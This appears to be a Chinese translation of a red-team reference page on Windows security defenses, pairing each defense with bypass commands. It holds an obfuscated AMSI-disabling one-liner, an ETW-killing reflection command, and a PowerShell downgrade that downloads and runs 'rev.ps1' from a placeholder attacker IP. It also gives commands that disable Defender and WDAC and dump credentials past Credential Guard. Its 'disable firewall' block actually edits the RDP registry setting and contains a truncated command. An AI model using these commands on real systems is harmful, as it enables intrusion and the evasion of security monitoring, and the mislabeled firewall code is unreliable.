# Windows - 防御

## 摘要

* [AppLocker](#applocker)
* [用户账户控制 (UAC)](#user-account-control)
* [DPAPI](#dpapi)
* [Powershell](#powershell)
    * [执行策略](#execution-policy)
    * [反恶意软件扫描接口 (AMSI)](#anti-malware-scan-interface)
    * [恰到好处的管理 (JEA)](#just-enough-administration)
    * [受限语言模式 (CLM)](#constrained-language-mode)
    * [脚本块与模块日志记录](#script-block-and-module-logging)
    * [PowerShell 成文记录 (Transcript)](#powershell-transcript)
    * [安全字符串 (SecureString)](#securestring)
* [受保护进程光 (PPL)](#protected-process-light)
* [凭据守卫 (Credential Guard)](#credential-guard)
* [Windows 事件跟踪 (ETW)](#event-tracing-for-windows)
* [攻击面减少 (ASR)](#attack-surface-reduction)
* [Windows Defender 防病毒](#windows-defender-antivirus)
* [Windows Defender 应用程序控制 (WDAC)](#windows-defender-application-control)
* [Windows Defender 防火墙](#windows-defender-firewall)
* [Windows 信息保护 (WIP)](#windows-information-protection)

## AppLocker

> AppLocker 是 Microsoft Windows 中的一项安全功能，它允许管理员控制允许用户在系统上运行哪些应用程序和文件。规则可以基于各种标准，如文件路径、文件发布者或文件哈希，并且可以应用于特定的用户或组。

* 枚举本地生效的 AppLocker 策略

    ```powershell
    PowerView PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
    PowerView PS C:\> Get-AppLockerPolicy -effective -xml
    Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe # (Keys: Appx, Dll, Exe, Msi and Script)
    ```

* AppLocker 绕过
    * 默认情况下，`C:\Windows` 不会被阻止，且 `C:\Windows\Tasks` 对任何用户都是可写的
    * [api0cradle/UltimateAppLockerByPassList/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)
    * [api0cradle/UltimateAppLockerByPassList/VerifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md)
    * [api0cradle/UltimateAppLockerByPassList/DLL-Execution.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md)
    * [api0cradle/AccessChk.bat](https://gist.github.com/api0cradle/95cd51fa1aa735d9331186f934df4df9)

## 用户账户控制 (UAC)

UAC 代表用户账户控制。它是 Microsoft 在 Windows Vista 中引入的一项安全功能，并存在于 Windows 操作系统的所有后续版本中。UAC 有助于减轻恶意软件的影响，并在允许对系统进行可能影响计算机所有用户的更改之前，通过请求许可或管理员密码来保护用户。

* 检查 UAC 是否启用

    ```ps1
    REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
    ```

* 检查 UAC 级别

    ```ps1
    REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
    REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v FilterAdministratorToken
    ```

| EnableLUA  | LocalAccountTokenFilterPolicy | FilterAdministratorToken | 描述 |
|---|---|---|---|
| 0 | / | / | 无 UAC |
| 1 | 1 | / | 无 UAC |
| 1 | 0 | 0 | 对 RID 500 无 UAC |
| 1 | 0 | 1 | 对所有人开启 UAC |

* UAC 绕过
    * [Microsoft 签名的自动提升 (AutoElevated) 二进制文件](https://www.elastic.co/guide/en/security/current/bypass-uac-via-sdclt.html) - `msconfig`, `sdclt.exe`, `eventvwr.exe` 等
    * [hfiref0x/UACME](https://github.com/hfiref0x/UACME) - 击败 Windows 用户账户控制
    * 查找自动提升的进程：

        ```ps1
        strings.exe -s *.exe | findstr /I "<autoElevate>true</autoElevate>"
        ```

## DPAPI

参考 [InternalAllTheThings/Windows - DPAPI.md](https://swisskyrepo.github.io/InternalAllTheThings/redteam/evasion/windows-dpapi/)

## Powershell

### 执行策略 (Execution Policy)

> PowerShell 执行策略是一个控制系统如何运行脚本的安全功能。它有助于防止未经授权的脚本执行，但它不是一个安全边界——它仅防止意外执行未经签名的脚本。

* 检查当前策略

    ```ps1
    Get-ExecutionPolicy
    ```

| 策略 | 描述 |
| ------------- | ------------------------------------------------- |
| Restricted | 不允许运行脚本（某些系统中的默认设置）。|
| AllSigned | 仅运行经过签名的脚本。|
| RemoteSigned | 本地脚本可运行，远程脚本必须经过签名。|
| Unrestricted | 运行所有脚本，对远程脚本发出警告。|
| Bypass | 无限制；运行所有脚本。|

* `Restricted`: 阻止执行所有脚本（工作站默认设置）。
* `RemoteSigned`: 阻止执行从 Internet 下载的未签名脚本，但允许执行 “本地” 脚本（服务器默认设置）。命令 `Unblock-File` 可用于移除 Web 标记 (MotW)，使下载的脚本看起来像 “本地” 脚本。

    ```ps1
    # 绕过
    Unblock-File <来自_Internet_的文件>
    ```

* `AllSigned`: 阻止所有未签名脚本。这是最安全的选项。

    ```ps1
    # 绕过
    Get-Content .\run.ps1 | Invoke-Expression
    ```

你可以直接运行带 `-ep Bypass` 选项的 `powershell.exe`，或者使用内置命令 `Set-ExecutionPolicy`。

```ps1
powershell -ep bypass
Set-ExecutionPolicy Bypass -Scope Process -Force
```

### 反恶意软件扫描接口 (AMSI)

> 反恶意软件扫描接口 (AMSI) 是一个 Windows API (应用程序编程接口)，它为应用程序和服务提供了一个统一的接口，以便与系统上安装的任何反恶意软件产品集成。该 API 允许反恶意软件解决方案在运行时扫描文件和脚本，并为应用程序提供了请求扫描特定内容的手段。

查找更多 AMSI 绕过方法：[Windows - AMSI Bypass.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass.md)

```powershell
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
```

### 恰到好处的管理 (JEA)

> 恰到好处的管理 (JEA) 是 Microsoft Windows Server 中的一项功能，允许管理员根据需要将特定的管理任务委托给非管理用户。JEA 提供了一种安全受控的方式来授予有限的、恰到好处的系统访问权限，同时确保用户无法执行非预期的操作或访问敏感信息。

从 JEA 中跳出：

* 列出可用的 cmdlet：`command`
* 寻找非默认的 cmdlet：

    ```ps1
    Set-PSSessionConfiguration
    Start-Process
    New-Service
    Add-Computer
    ```

### 受限语言模式 (CLM)

检查是否处于受限模式：`$ExecutionContext.SessionState.LanguageMode`

* 使用旧版 Powershell 绕过。Powershell v2 不支持 CLM。

    ```ps1
    powershell.exe -version 2
    powershell.exe -version 2 -ExecutionPolicy bypass
    powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://攻击者_IP/rev.ps1')"
    ```

* 当使用 `__PSLockDownPolicy` 时绕过。只需在路径中的某处放入 "System32"。

    ```ps1
    # 从环境启用 CLM
    [Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')
    Get-ChildItem -Path Env:

    # 创建包含你的 “恶意” powershell 命令的 check-mode.ps1
    $mode = $ExecutionContext.SessionState.LanguageMode
    write-host $mode

    # 简单绕过，在 System32 文件夹内执行
    PS C:\> C:\Users\Public\check-mode.ps1
    ConstrainedLanguage

    PS C:\> C:\Users\Public\System32\check-mode.ps1
    FullLanguagge
    ```

* 使用 COM 绕过：[xpn/COM_to_registry.ps1](https://gist.githubusercontent.com/xpn/1e9e879fab3e9ebfd236f5e4fdcfb7f1/raw/ceb39a9d5b0402f98e8d3d9723b0bd19a84ac23e/COM_to_registry.ps1)
* 使用你自己的 Powershell DLL 绕过：[p3nt4/PowerShdll](https://github.com/p3nt4/PowerShdll) & [iomoath/PowerShx](https://github.com/iomoath/PowerShx)

    ```ps1
    rundll32 PowerShdll,main <脚本>
    rundll32 PowerShdll,main -h      显示此消息
    rundll32 PowerShdll,main -f <路径>       运行作为参数传递的脚本
    rundll32 PowerShdll,main -w      在新窗口中启动交互式控制台（默认）
    rundll32 PowerShdll,main -i      在此控制台中启动交互式控制台

    rundll32 PowerShx.dll,main -e                           <要运行的 PS 脚本>
    rundll32 PowerShx.dll,main -f <路径>                    运行作为参数传递的脚本
    rundll32 PowerShx.dll,main -f <路径> -c <PS_Cmdlet>     加载脚本并运行 PS cmdlet
    rundll32 PowerShx.dll,main -w                           在新窗口中启动交互式控制台
    rundll32 PowerShx.dll,main -i                           启动交互式控制台
    rundll32 PowerShx.dll,main -s                           尝试绕过 AMSI
    rundll32 PowerShx.dll,main -v                           将执行输出打印到控制台
    ```

### 脚本块与模块日志记录

> 一旦启用了脚本块日志记录，执行的脚本块和命令将记录在 “Windows PowerShell” 频道下的 Windows 事件日志中。要查看日志，管理员可以使用事件查看器应用程序并导航至 “Windows PowerShell” 频道。

启用脚本块日志记录：

```ps1
function Enable-PSScriptBlockLogging
{
    $basePath = 'HKLM:\Software\Policies\Microsoft\Windows' +
      '\PowerShell\ScriptBlockLogging'

    if(-not (Test-Path $basePath))
    {
        $null = New-Item $basePath -Force
    }

    Set-ItemProperty $basePath -Name EnableScriptBlockLogging -Value "1"
}
```

使用 [tandasat/KillETW.ps1](https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32) 禁用当前 PowerShell 会话的 ETW：

```ps1
# 此 PowerShell 命令将 0 设置给 System.Management.Automation.Tracing.PSEtwLogProvider etwProvider.m_enabled，从而有效地禁用可疑脚本块日志记录等。
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

### PowerShell 成文记录 (Transcript)

PowerShell 成文记录是一项日志记录功能，它记录 PowerShell 会话中的所有命令和输出。它通过将会话活动保存到文本文件中，有助于审计、调试和故障排除。

启动成文记录并将输出存储在自定义文件中：

```ps1
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
```

PowerShell 成文记录输出的常见位置：

```ps1
C:\Users\<用户名>\Documents\PowerShell_transcript.<主机名>.<随机字符>.<时间戳>.txt
C:\Transcripts\<日期>\PowerShell_transcript.<主机名>.<随机字符>.<时间戳>.txt
```

### 安全字符串 (SecureString)

PowerShell 中的 `SecureString` 是一种数据类型，旨在以比纯字符串更安全的方式存储密码或机密数据等敏感信息。与以纯文本存储数据且易于在内存中访问的常规字符串不同，`SecureString` 在内存中对数据进行加密，为防止未经授权的访问提供了更好的保护。

转换为 SecureString

```ps1
$original = '我的密码'  
$secureString = ConvertTo-SecureString $original -AsPlainText -Force
$secureStringValue = ConvertFrom-SecureString $secureString
```

获取原始内容

```ps1
$secureStringBack = $secureStringValue | ConvertTo-SecureString
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureStringBack);
$finalValue = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
```

当创建 `SecureString` 时，纯文本字符会立即使用数据保护 API (**DPAPI**) 进行加密。

使用 AES 密钥

```ps1
[Byte[]] $key = (49,222,...,87,159)
$pass = (echo "AA...AA=" | ConvertTo-SecureString -Key $key)
[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass))
```

## 受保护进程光 (PPL)

受保护进程光 (PPL) 作为一种 Windows 安全机制实现，它允许将进程标记为 “受保护”，并在一个安全且隔离的环境中运行，在该环境中，它们可以免受恶意软件或其他未经授权进程的攻击。PPL 用于保护对操作系统运行至关重要的进程，如防病毒软件、防火墙和其他安全相关的进程。

当进程使用 PPL 被标记为 “受保护” 时，它会被分配一个安全级别，该级别决定了它将获得的保护水平。此安全级别可以设置为多个级别之一，从低到高。被分配到较高安全级别的进程比被分配到较低安全级别的进程获得更多的保护。

进程的保护由 “级别” 和 “签名者” 的组合定义。下表代表了常用的组合，源自 [itm4n.github.io](https://itm4n.github.io/lsass-runasppl/)。

| 保护级别 | 值 | 签名者 | 类型 |
|---------------------------------|------|------------------|---------------------|
| PS_PROTECTED_SYSTEM             | 0x72 | WinSystem (7)    | Protected (2)       |
| PS_PROTECTED_WINTCB             | 0x62 | WinTcb (6)       | Protected (2)       |
| PS_PROTECTED_WINDOWS            | 0x52 | Windows (5)      | Protected (2)       |
| PS_PROTECTED_AUTHENTICODE       | 0x12 | Authenticode (1) | Protected (2)       |
| PS_PROTECTED_WINTCB_LIGHT       | 0x61 | WinTcb (6)       | Protected Light (1) |
| PS_PROTECTED_WINDOWS_LIGHT      | 0x51 | Windows (5)      | Protected Light (1) |
| PS_PROTECTED_LSA_LIGHT          | 0x41 | Lsa (4)          | Protected Light (1) |
| PS_PROTECTED_ANTIMALWARE_LIGHT  | 0x31 | Antimalware (3)  | Protected Light (1) |
| PS_PROTECTED_AUTHENTICODE_LIGHT | 0x11 | Authenticode (1) | Protected Light (1) |

PPL 通过限制对受保护进程内存和系统资源的访问，以及防止进程被其他进程或用户修改或终止来工作。该进程也与系统中运行的其他进程隔离，这有助于防止尝试利用共享资源或依赖项的攻击。

* 检查 LSASS 是否在 PPL 中运行

    ```ps1
    reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
    ```

* 受保护进程示例：即使拥有管理员权限，也无法终止 Microsoft Defender。

    ```ps1
    taskkill /f /im MsMpEng.exe
    错误: 无法终止 PID 为 5784 的进程 "MsMpEng.exe"。
    原因: 拒绝访问。
    ```

* 可以使用存在漏洞的驱动程序（自带漏洞驱动程序 / BYOVD）将其禁用。

## 凭据守卫 (Credential Guard)

当启用凭据守卫时，它使用基于硬件的虚拟化来创建一个与操作系统分离的安全环境。该安全环境用于存储敏感的凭据信息，这些信息经过加密并受到保护，防止未经授权的访问。

凭据守卫结合使用基于硬件的虚拟化和可信平台模块 (TPM)，以确保安全内核是可信且安全的。它可以在具有兼容处理器和 TPM 版本的设备上启用，并且需要支持必要特性的 UEFI 固件。

* [bytewreck/DumpGuard](https://github.com/bytewreck/DumpGuard) - 用于从现代 Windows 系统会话中提取 NTLMv1 哈希的验证工具。
* [EvanMcBroom/lsa-whisperer](https://github.com/EvanMcBroom/lsa-whisperer) - 用于使用各自的消息协议与身份验证包进行交互的工具。

| 技术 | 需要<br>SYSTEM | 需要<br>SPN 账户 | 能否转储<br>Credential Guard |
| -------- | :-------: | :-------: | :-------: |
| 通过远程凭据守卫协议提取自己的凭据 | :x:| ✅ | ✅ |
| 通过远程凭据守卫协议提取所有凭据 | ✅ | ✅ | ✅ |
| 通过 Microsoft v1 身份验证包提取所有凭据 | ✅ | :x: | :x: |

* **使用远程凭据守卫转储自己的会话**：无论凭据守卫的状态如何，这都有效，但需要已启用 SPN 账户的凭据。

    ```ps1
    DumpGuard.exe /mode:self /domain:<域名> /username:<sAMAccountName> /password:<密码> [/spn:<SPN>]
    ```

* **使用远程凭据守卫转储所有会话**：无论凭据守卫的状态如何，这都有效，但需要已启用 SPN 账户的凭据以及 `SYSTEM` 权限。

    ```ps1
    DumpGuard.exe /mode:all /domain:<域名> /username:<sAMAccountName> /password:<密码> [/spn:<SPN>]
    ```

* **使用 Microsoft v1 身份验证包转储所有会话**
    * 本地系统上已禁用凭据守卫。
    * 远程用户通过远程凭据守卫从远程主机身份验证到本地系统。

    ```ps1
    DumpGuard.exe /mode:all
    # 或
    lsa-whisperer.exe msv1_0 Lm20GetChallengeResponse --luid {会话 ID} --challenge {发给客户端的挑战} [标志...]
    ```

## Windows 事件跟踪 (ETW)

ETW (Windows 事件跟踪) 是一种基于 Windows 的日志记录机制，提供了一种实时收集和分析系统事件及性能数据的方法。ETW 允许开发人员和系统管理员收集有关系统性能和行为的详细信息，这些信息可用于故障排除、优化和安全目的。

| 名称 | GUID |
|---------------------------------------|----------------------------------------|
| Microsoft-Antimalware-Scan-Interface  | {2A576B87-09A7-520E-C21A-4942F0271D67} |
| Microsoft-Windows-PowerShell          | {A0C1853B-5C40-4B15-8766-3CF1C58F985A} |
| Microsoft-Antimalware-Protection      | {E4B70372-261F-4C54-8FA6-A5A7914D73DA} |
| Microsoft-Windows-Threat-Intelligence | {F4E1897C-BB5D-5668-F1D8-040F4D8DD344} |

你可以查看 Windows 中注册的所有提供程序：`logman query providers`

```ps1
PS C:\Users\User\Documents> logman query providers

提供程序                                 GUID
-------------------------------------------------------------------------------
.NET Common Language Runtime             {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}
ACPI Driver Trace Provider               {DAB01D4D-2D48-477D-B1C3-DAAD0CE6F06B}
Active Directory Domain Services: SAM    {8E598056-8993-11D2-819E-0000F875A064}
Active Directory: Kerberos Client        {BBA3ADD2-C229-4CDB-AE2B-57EB6966B0C4}
Active Directory: NetLogon               {F33959B4-DBEC-11D2-895B-00C04F79AB69}
ADODB.1                                  {04C8A86F-3369-12F8-4769-24E484A9E725}
ADOMD.1                                  {7EA56435-3F2F-3F63-A829-F0B35B5CAD41}
...
```

我们可以通过以下命令获取有关提供程序的更多信息：`logman query providers {ProviderID}/Provider-Name`

```ps1
PS C:\Users\User\Documents> logman query providers Microsoft-Antimalware-Scan-Interface

提供程序                                 GUID
-------------------------------------------------------------------------------
Microsoft-Antimalware-Scan-Interface     {2A576B87-09A7-520E-C21A-4942F0271D67}

值                   关键字               描述
-------------------------------------------------------------------------------
0x0000000000000001  Event1
0x8000000000000000  AMSI/Debug

值                   级别                 描述
-------------------------------------------------------------------------------
0x04                win:Informational    信息

PID                 图像
-------------------------------------------------------------------------------
0x00002084          C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
0x00002084          C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
0x00001bd4
0x00000ad0
0x00000b98
```

`Microsoft-Windows-Threat-Intelligence` 提供程序对应于 ETWTI，这是 EDR 可以订阅并识别恶意 API 使用（如进程注入）的额外安全功能。

```ps1
0x0000000000000001  KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL
0x0000000000000002  KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL_KERNEL_CALLER
0x0000000000000004  KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE
0x0000000000000008  KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE_KERNEL_CALLER
0x0000000000000010  KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL
0x0000000000000020  KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL_KERNEL_CALLER
0x0000000000000040  KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE
0x0000000000000080  KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE_KERNEL_CALLER
0x0000000000000100  KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL
0x0000000000000200  KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL_KERNEL_CALLER
0x0000000000000400  KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE
0x0000000000000800  KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE_KERNEL_CALLER
0x0000000000001000  KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE
0x0000000000002000  KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE_KERNEL_CALLER
0x0000000000004000  KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE
0x0000000000008000  KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE_KERNEL_CALLER
0x0000000000010000  KERNEL_THREATINT_KEYWORD_READVM_LOCAL
0x0000000000020000  KERNEL_THREATINT_KEYWORD_READVM_REMOTE
0x0000000000040000  KERNEL_THREATINT_KEYWORD_WRITEVM_LOCAL
0x0000000000080000  KERNEL_THREATINT_KEYWORD_WRITEVM_REMOTE
0x0000000000100000  KERNEL_THREATINT_KEYWORD_SUSPEND_THREAD
0x0000000000200000  KERNEL_THREATINT_KEYWORD_RESUME_THREAD
0x0000000000400000  KERNEL_THREATINT_KEYWORD_SUSPEND_PROCESS
0x0000000000800000  KERNEL_THREATINT_KEYWORD_RESUME_PROCESS
```

最常用的绕过技术是修补 `EtwEventWrite` 函数，该函数被调用以写入/记录 ETW 事件。你可以使用 `logman query providers -pid <PID>` 列出为进程注册的提供程序。

## 攻击面减少 (ASR)

> 攻击面减少 (ASR) 是指用于减少攻击者可能用来利用系统或网络潜在切入点的策略和技术。

```ps1
Add-MpPreference -AttackSurfaceReductionRules_Ids <Id> -AttackSurfaceReductionRules_Actions AuditMode
Add-MpPreference -AttackSurfaceReductionRules_Ids <Id> -AttackSurfaceReductionRules_Actions Enabled
```

| 描述 | ID |
|---------------------------------------------------------------------------|--------------------------------------|
| 阻止执行可能混淆的脚本 | 5beb7efe-fd9a-4556-801d-275e5ffc04cc |
| 阻止 JavaScript 或 VBScript 启动下载的可执行内容 | d3e037e1-3eb8-44c8-a917-57927947596d |
| 阻止滥用已利用的漏洞签名驱动程序 | 56a863a9-875e-4185-98a7-b882c64b5ce5 |
| 阻止来自电子邮件客户端和 Web 邮件的可执行内容 | be9ba2d9-53ea-4cdc-84e5-9b1eeee46550 |
| 阻止源自 PSExec 和 WMI 命令的进程创建 | d1e49aac-8f56-4280-b9ba-993a6d77406c |
| 使用针对勒索软件的高级保护 | c1db55ab-c21a-4637-bb3f-a12568109d35 |
| 阻止从 Windows 本地安全机构子系统 (lsass.exe) 窃取凭据 | 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 |

## Windows Defender 防病毒

也称为 `Microsoft Defender`。

* 检查 Defender 状态

    ```powershell
    PS C:\> Get-MpComputerStatus
    ```

* 禁用扫描所有下载的文件和附件

    ```powershell
    PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
    PS C:\> Set-MpPreference -DisableIOAVProtection $true
    ```

* 禁用 AMSI (设置为 0 以启用)

    ```powershell
    PS C:\> Set-MpPreference -DisableScriptScanning 1 
    ```

* 从扫描中排除文件夹、进程

    ```powershell
    PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
    PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
    PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
    ```

* 使用 WMI 排除文件夹

    ```powershell
    PS C:\> WMIC /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath="C:\Users\Public\wmic"
    ```

* 移除特征库。**注意**：如果存在 Internet 连接，它们将会再次被下载。

    ```powershell
    PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
    PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
    ```

识别被 Windows Defender 防病毒软件检测到的具体字节：

* [matterpreter/DefenderCheck](https://github.com/matterpreter/DefenderCheck) - 识别 Microsoft Defender 标记的字节
* [gatariee/gocheck](https://github.com/gatariee/gocheck) - 高速版 DefenderCheck

## Windows Defender 应用程序控制

也称为 `WDAC/UMCI/Device Guard`。

> Windows Defender 应用程序控制，前身称为 Device Guard，有权控制应用程序是否可以在 Windows 设备上执行。WDAC 将防止多余的或恶意的代码、驱动程序和脚本的执行、运行和加载。WDAC 不信任任何它不知道的软件。

* 获取 WDAC 当前模式

    ```ps1
    $ Get-ComputerInfo
    DeviceGuardCodeIntegrityPolicyEnforcementStatus         : EnforcementMode
    DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus : EnforcementMode
    ```

* 使用 CiTool.exe 移除 WDAC 策略 (Windows 11 2022 Update)

    ```ps1
    CiTool.exe -rp "{PolicyId GUID}" -json
    ```

* Device Guard 策略位置: `C:\Windows\System32\CodeIntegrity\CiPolicies\Active\{PolicyId GUID}.cip`
* Device Guard 示例策略: `C:\Windows\System32\CodeIntegrity\ExamplePolicies\`
* WDAC 工具: [mattifestation/WDACTools](https://github.com/mattifestation/WDACTools)，一个便于构建、配置、部署和审计 Windows Defender 应用程序控制 (WDAC) 策略的 PowerShell 模块
* WDAC 绕过技术: [bohops/UltimateWDACBypassList](https://github.com/bohops/UltimateWDACBypassList)
    * [nettitude/Aladdin](https://github.com/nettitude/Aladdin) - 使用 AddInProcess.exe 绕过 WDAC

## Windows Defender 防火墙

* 列出防火墙状态和当前配置

    ```powershell
    netsh advfirewall firewall dump
    # 或 
    netsh firewall show state
    netsh firewall show config
    ```

* 列出防火墙阻断的端口

    ```powershell
    $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
    ```

* 禁用防火墙

    ```powershell
    # 通过 cmd 禁用防火墙
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f

    # 通过 Powershell 禁用防火墙
    powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`

    # 使用原生命令禁用任何 Windows 防火墙
    netsh firewall set opmode disable
    netsh Advfirewall set allprofiles state off
    ```

## Windows 信息保护 (WIP)

Windows 信息保护 (WIP)，前身称为企业数据保护 (EDP)，是 Windows 10 中的一项安全功能，有助于保护企业设备上的敏感数据。WIP 通过允许管理员定义控制如何访问、共享和保护企业数据的策略，有助于防止意外数据泄露。WIP 通过识别和分离设备上的企业数据与个人数据来工作。

本地标记为企业的文件的保护是通过 Windows 的加密文件系统 (EFS) 加密（NTFS 文件系统的一项功能）实现的。

* 枚举文件属性，`Encrypted` 属性用于受 WIP 保护的文件

    ```ps1
    PS C:\> (Get-Item -Path 'C:\...').attributes
    Archive, Encrypted
    ```

* 加密文件: `cipher /c <加密文件.后缀>`
* 解密文件: `cipher /d <加密文件.后缀>`

**企业上下文 (Enterprise Context)** 列显示每个应用程序可以对你的企业数据执行哪些操作：

* **Domain**。显示员工的工作域 (例如 corp.contoso.com)。此应用程序被视为与工作相关，可以自由接触并打开工作数据和资源。
* **Personal**。显示文本 Personal。此应用程序被视为与工作无关，无法接触任何工作数据或资源。
* **Exempt**。显示文本 Exempt。Windows 信息保护策略不适用于这些应用程序 (例如系统组件)。

## BitLocker 驱动器加密

BitLocker 是 Microsoft Windows 操作系统中包含的一个全盘加密功能，始于 Windows Vista。它旨在通过为整个卷提供加密来保护数据。BitLocker 使用 AES 加密算法加密磁盘上的数据。启用后，BitLocker 要求用户在加载操作系统之前输入密码或插入 USB 闪存驱动器以解锁加密卷，从而确保磁盘上的数据免受未经授权的访问。BitLocker 通常用于笔记本电脑、便携式存储设备和其他移动设备，以防被盗或丢失时保护敏感数据。

当 BitLocker 处于 `Suspended` 状态时，使用 Windows 安装 USB 引导系统，然后使用此命令解密驱动器：`manage-bde -off c:`

你可以使用此命令检查是否已完成解密：`manage-bde -status`

## 参考资料

* [Attack surface reduction rules reference - Microsoft 365 - November 30, 2023](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide)
* [Catching Credential Guard Off Guard - Valdemar Carøe - October 23, 2025](https://specterops.io/blog/2025/10/23/catching-credential-guard-off-guard/)
* [Create and verify an Encrypting File System (EFS) Data Recovery Agent (DRA) certificate - Microsoft - December 9, 2022](https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/create-and-verify-an-efs-dra-certificate)
* [Determine the Enterprise Context of an app running in Windows Information Protection (WIP) - Microsoft - March 10, 2023](https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/wip-app-enterprise-context)
* [DISABLING AV WITH PROCESS SUSPENSION - Christopher Paschen - March 24, 2023](https://www.trustedsec.com/blog/disabling-av-with-process-suspension/)
* [Disabling Event Tracing For Windows - UNPROTECT Project - April 19, 2022](https://unprotect.it/technique/disabling-event-tracing-for-windows-etw/)
* [Do You Really Know About LSA Protection (RunAsPPL)? - itm4n - April 7, 2021](https://itm4n.github.io/lsass-runasppl/)
* [ETW: Event Tracing for Windows 101 - ired.team - January 6, 2020](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101)
* [PowerShell about_Logging_Windows - Microsoft Documentation - September 30, 2025](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.3)
* [Remove Windows Defender Application Control (WDAC) policies - Microsoft - December 9, 2022](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/disable-windows-defender-application-control-policies)
* [Sneaking Past Device Guard - Cybereason - Philip Tsukerman - December 4, 2022](https://troopers.de/downloads/troopers19/TROOPERS19_AR_Sneaking_Past_Device_Guard.pdf)
